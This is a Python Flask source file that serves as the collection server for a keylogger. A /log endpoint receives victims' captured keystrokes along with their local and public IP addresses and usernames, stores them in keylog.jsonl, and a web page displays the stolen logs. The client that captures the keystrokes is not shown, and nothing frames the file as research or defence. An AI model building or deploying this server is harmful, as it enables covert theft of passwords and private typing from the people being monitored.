from flask import Flask, request, render_template, jsonify
from datetime import datetime
import json
import os

app = Flask(__name__)
LOG_FILE = "keylog.jsonl"

@app.route('/log', methods=['POST'])
def log_keystrokes():
    data = request.get_json()

    if not data or "keystrokes" not in data:
        return jsonify({"error": "Dados inválidos"}), 400

    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "local_ip": data.get("local_ip", "unknown"),
        "public_ip": data.get("public_ip", "unknown"),
        "username": data.get("username", "unknown"),
        "keystrokes": data["keystrokes"]
    }

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(log_entry) + "\n")

    return jsonify({"status": "ok"}), 200

@app.route('/')
def index():
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            for line in f:
                try:
                    logs.append(json.loads(line))
                except:
                    continue
    return render_template("index.html", logs=logs[::-1])

if __name__ == '__main__':
    app.run(debug=True)